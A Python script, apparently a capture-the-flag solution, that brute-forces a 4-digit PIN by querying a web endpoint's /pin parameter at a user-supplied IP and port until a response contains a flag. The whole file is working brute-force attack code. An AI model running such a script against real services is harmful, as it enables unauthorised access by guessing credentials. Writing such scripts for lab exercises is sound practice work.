"""
Script to attempt finding a 4-digit PIN by querying a web server endpoint.
It prompts the user for the target IP address and port number.
"""

import requests
import ipaddress # For IP address validation
import sys       # To exit the script gracefully

def get_connection_details():
    """
    Prompts the user for an IPv4 address and port number,
    validates the input, and returns them.
    """
    while True: # Loop until a valid IP address is entered
        ip_str = input("Enter the target IPv4 address: ")
        try:
            ip = ipaddress.ip_address(ip_str)
            if ip.version == 4:
                 print(f"Valid IPv4 address entered: {ip}")
                 break # Exit the loop if valid
            else:
                 print("Invalid input. Please enter a valid IPv4 address.")
        except ValueError:
            print("Invalid format. Please enter a valid IPv4 address (e.g., 192.168.1.1).")

    while True: # Loop until a valid port number is entered
        port_str = input("Enter the target port number: ")
        try:
            port = int(port_str)
            if 1 <= port <= 65535:
                print(f"Valid port number entered: {port}")
                break # Exit the loop if valid
            else:
                print("Invalid port number. Please enter a number between 1 and 65535.")
        except ValueError:
            print("Invalid input. Please enter a whole number for the port.")

    # Return the validated IP (as string) and port (as integer)
    return str(ip), port

# --- Main script execution ---
if __name__ == "__main__":
    # Get validated IP and Port from the user
    target_ip, target_port = get_connection_details()
    print(f"\nStarting PIN guessing against http://{target_ip}:{target_port}...")

    # Base URL construction
    base_url = f"http://{target_ip}:{target_port}/pin"

    # Try every possible 4-digit PIN (from 0000 to 9999)
    for pin in range(10000):
        formatted_pin = f"{pin:04d}" # Convert number to 4-digit string (e.g., 7 -> "0007")
        target_url = f"{base_url}?pin={formatted_pin}"
        # Optional: print less frequently to speed things up slightly
        if pin % 100 == 0:
             print(f"Attempting PINs around {formatted_pin}...")
             # You could remove the print inside the loop entirely for max speed

        try:
            # Send the GET request to the server
            # Added a timeout (e.g., 5 seconds) to prevent hanging indefinitely
            response = requests.get(target_url, timeout=5)

            # Check if the status code indicates success (e.g., 200 OK)
            if response.ok:
                try:
                    # Try to parse the response as JSON
                    data = response.json()
                    # Check if the 'flag' key exists in the JSON data
                    if 'flag' in data:
                        print(f"\n>>> Success! <<<")
                        print(f"Correct PIN found: {formatted_pin}")
                        print(f"Flag: {data['flag']}")
                        break # Exit the loop since we found the flag
                except requests.exceptions.JSONDecodeError:
                    # Server responded with OK status, but not with valid JSON
                    # This might happen, continue to the next PIN
                    # print(f"PIN {formatted_pin}: Status OK, but not valid JSON response.")
                    pass # Silently continue, or print a message if needed

            # Optional: Handle specific error codes if needed
            # elif response.status_code == 404:
            #     print(f"PIN {formatted_pin}: Not Found (404).")
            # else:
            #     print(f"PIN {formatted_pin}: Received status {response.status_code}.")

        except requests.exceptions.ConnectionError:
            print(f"\nError: Could not connect to http://{target_ip}:{target_port}.")
            print("Please check the IP address, port, and ensure the server is running.")
            sys.exit(1) # Exit the script because we can't connect
        except requests.exceptions.Timeout:
            print(f"Warning: Request for PIN {formatted_pin} timed out. Trying next PIN.")
            # Continue to the next PIN if one request times out
        except requests.exceptions.RequestException as e:
            # Catch any other potential errors from the requests library
            print(f"\nAn unexpected error occurred during request for PIN {formatted_pin}: {e}")
            # Decide whether to continue or exit based on the error
            # For now, let's try continuing
            pass

    else:
        # This 'else' block executes if the loop completes *without* hitting 'break'
        print("\nFinished trying all PINs (0000-9999). Correct PIN not found or flag not present in successful responses.")
